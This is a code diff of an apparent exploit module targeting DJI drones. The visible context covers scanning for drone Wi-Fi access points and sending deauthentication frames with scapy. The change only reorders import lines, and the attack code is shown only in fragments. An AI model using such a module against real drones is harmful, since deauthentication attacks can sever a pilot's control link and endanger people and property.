@@ -121,7 +121,7 @@ class Exploit(HTTPClient):
         if self.do_scan:
             print_status("[Stage 1] Scanning for DJI drone APs (requires scapy + monitor mode)")
             try:
-                from scapy.all import Dot11, Dot11Beacon, sniff, conf
+                from scapy.all import Dot11, Dot11Beacon, conf, sniff
                 conf.iface = self.interface
                 found = {}
 
@@ -152,7 +152,7 @@ class Exploit(HTTPClient):
                 return
             print_warning("[Stage 2] Sending deauth frames — AUTHORIZED LAB ONLY")
             try:
-                from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
+                from scapy.all import Dot11, Dot11Deauth, RadioTap, conf, sendp
                 conf.iface = self.interface
                 frame = (
                     RadioTap()
